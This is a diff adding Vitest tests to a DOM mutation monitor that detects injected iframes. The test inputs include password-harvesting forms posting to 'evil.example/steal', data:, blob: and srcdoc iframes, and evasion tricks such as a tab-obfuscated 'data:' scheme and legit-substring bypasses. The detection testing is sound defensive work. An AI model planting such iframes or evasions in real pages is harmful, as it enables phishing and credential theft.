@@ -266,6 +266,175 @@ describe("mutation_monitor DOM integration", () => {
     stopMutationMonitor();
   });
 
+  it("flags an injected data: iframe by its opaque scheme (D-IFRAME)", async () => {
+    const alerts: MutationAlert[] = [];
+    startMutationMonitor(document, (a) => alerts.push(a));
+
+    // A data: iframe is its own opaque origin with no hostname, so the
+    // cross-domain check can't catch it; the scheme check must.
+    const iframe = document.createElement("iframe");
+    iframe.src = "data:text/html,<form><input type=password></form>";
+    document.body.appendChild(iframe);
+
+    await vi.advanceTimersByTimeAsync(150);
+
+    const iframeAlerts = alerts.filter((a) => a.type === "suspicious_iframe");
+    expect(iframeAlerts.some((a) => a.details.includes("data-scheme src"))).toBe(true);
+
+    iframe.remove();
+    stopMutationMonitor();
+  });
+
+  it("flags an injected blob: iframe by its opaque scheme (D-IFRAME)", async () => {
+    const alerts: MutationAlert[] = [];
+    startMutationMonitor(document, (a) => alerts.push(a));
+
+    const iframe = document.createElement("iframe");
+    iframe.src = "blob:https://evil.example/0e8c2b1a-uuid";
+    document.body.appendChild(iframe);
+
+    await vi.advanceTimersByTimeAsync(150);
+
+    const iframeAlerts = alerts.filter((a) => a.type === "suspicious_iframe");
+    expect(iframeAlerts.some((a) => a.details.includes("blob-scheme src"))).toBe(true);
+
+    iframe.remove();
+    stopMutationMonitor();
+  });
+
+  it("flags a data: iframe whose scheme is obfuscated with an interior tab (D-IFRAME R2)", async () => {
+    const alerts: MutationAlert[] = [];
+    startMutationMonitor(document, (a) => alerts.push(a));
+
+    // "da<TAB>ta:" — a browser strips the tab and resolves it as data:, so the
+    // scheme check must normalize the same way rather than be evaded.
+    const iframe = document.createElement("iframe");
+    iframe.setAttribute("src", "da\tta:text/html,<form><input type=password></form>");
+    document.body.appendChild(iframe);
+
+    await vi.advanceTimersByTimeAsync(150);
+
+    const iframeAlerts = alerts.filter((a) => a.type === "suspicious_iframe");
+    expect(iframeAlerts.some((a) => a.details.includes("data-scheme src"))).toBe(true);
+
+    iframe.remove();
+    stopMutationMonitor();
+  });
+
+  it("flags an injected srcdoc iframe (inline HTML, no src) (D-IFRAME R2)", async () => {
+    const alerts: MutationAlert[] = [];
+    startMutationMonitor(document, (a) => alerts.push(a));
+
+    const iframe = document.createElement("iframe");
+    iframe.setAttribute("srcdoc", "<form action='https://evil.example/steal'><input type=password></form>");
+    document.body.appendChild(iframe);
+
+    await vi.advanceTimersByTimeAsync(150);
+
+    const iframeAlerts = alerts.filter((a) => a.type === "suspicious_iframe");
+    expect(iframeAlerts.some((a) => a.details.includes("srcdoc (inline HTML)"))).toBe(true);
+
+    iframe.remove();
+    stopMutationMonitor();
+  });
+
+  it("flags a malicious srcdoc paired with a legit src (srcdoc renders over src) (D-IFRAME R2)", async () => {
+    const alerts: MutationAlert[] = [];
+    startMutationMonitor(document, (a) => alerts.push(a));
+
+    // A legit recaptcha src must not let the malicious inline srcdoc slip past
+    // the isLegitIframeSrc early-return.
+    const iframe = document.createElement("iframe");
+    iframe.setAttribute("src", "https://www.google.com/recaptcha/api2/anchor");
+    iframe.setAttribute("srcdoc", "<form action='https://evil.example/steal'><input type=password></form>");
+    document.body.appendChild(iframe);
+
+    await vi.advanceTimersByTimeAsync(150);
+
+    const iframeAlerts = alerts.filter((a) => a.type === "suspicious_iframe");
+    expect(iframeAlerts.some((a) => a.details.includes("srcdoc (inline HTML)"))).toBe(true);
+
+    iframe.remove();
+    stopMutationMonitor();
+  });
+
+  it("flags srcdoc set via a later attribute mutation, not just at insertion (D-IFRAME R2)", async () => {
+    const alerts: MutationAlert[] = [];
+    startMutationMonitor(document, (a) => alerts.push(a));
+
+    const iframe = document.createElement("iframe"); // bare iframe, no src/srcdoc yet
+    document.body.appendChild(iframe);
+    await vi.advanceTimersByTimeAsync(150);
+
+    // Two-step: set srcdoc after insertion. 'srcdoc' must be observed.
+    iframe.setAttribute("srcdoc", "<form><input type=password></form>");
+    await vi.advanceTimersByTimeAsync(150);
+
+    const iframeAlerts = alerts.filter((a) => a.type === "suspicious_iframe");
+    expect(iframeAlerts.some((a) => a.details.includes("srcdoc (inline HTML)"))).toBe(true);
+
+    iframe.remove();
+    stopMutationMonitor();
+  });
+
+  it("does not raise a data-scheme reason for an interior-space pseudo-scheme (D-IFRAME R2)", async () => {
+    const alerts: MutationAlert[] = [];
+    startMutationMonitor(document, (a) => alerts.push(a));
+
+    // "da ta:" has an interior space → an invalid scheme the browser treats as a
+    // relative URL, so it must NOT be normalized into a data: match (no FP).
+    const iframe = document.createElement("iframe");
+    iframe.setAttribute("src", "da ta:text/html,x");
+    document.body.appendChild(iframe);
+
+    await vi.advanceTimersByTimeAsync(150);
+
+    const iframeAlerts = alerts.filter((a) => a.type === "suspicious_iframe");
+    expect(iframeAlerts.some((a) => a.details.includes("data-scheme src"))).toBe(false);
+
+    iframe.remove();
+    stopMutationMonitor();
+  });
+
+  it("flags a data: src even when its payload contains a legit-pattern substring (D-IFRAME R3)", async () => {
+    const alerts: MutationAlert[] = [];
+    startMutationMonitor(document, (a) => alerts.push(a));
+
+    // "recaptcha" embedded in the data: payload must NOT exempt it via the
+    // unanchored isLegitIframeSrc substring match — the scheme is resolved first.
+    const iframe = document.createElement("iframe");
+    iframe.setAttribute(
+      "src",
+      "data:text/html,<!--recaptcha--><form action='https://evil.example/steal'><input type=password></form>",
+    );
+    document.body.appendChild(iframe);
+
+    await vi.advanceTimersByTimeAsync(150);
+
+    const iframeAlerts = alerts.filter((a) => a.type === "suspicious_iframe");
+    expect(iframeAlerts.some((a) => a.details.includes("data-scheme src"))).toBe(true);
+
+    iframe.remove();
+    stopMutationMonitor();
+  });
+
+  it("flags a blob: src whose host contains a legit-pattern substring (D-IFRAME R3)", async () => {
+    const alerts: MutationAlert[] = [];
+    startMutationMonitor(document, (a) => alerts.push(a));
+
+    const iframe = document.createElement("iframe");
+    iframe.setAttribute("src", "blob:https://recaptcha.evil.example/0e8c2b1a-uuid");
+    document.body.appendChild(iframe);
+
+    await vi.advanceTimersByTimeAsync(150);
+
+    const iframeAlerts = alerts.filter((a) => a.type === "suspicious_iframe");
+    expect(iframeAlerts.some((a) => a.details.includes("blob-scheme src"))).toBe(true);
+
+    iframe.remove();
+    stopMutationMonitor();
+  });
+
   it("caps alerts at 50", async () => {
     const alerts: MutationAlert[] = [];
     startMutationMonitor(document, (a) => alerts.push(a));
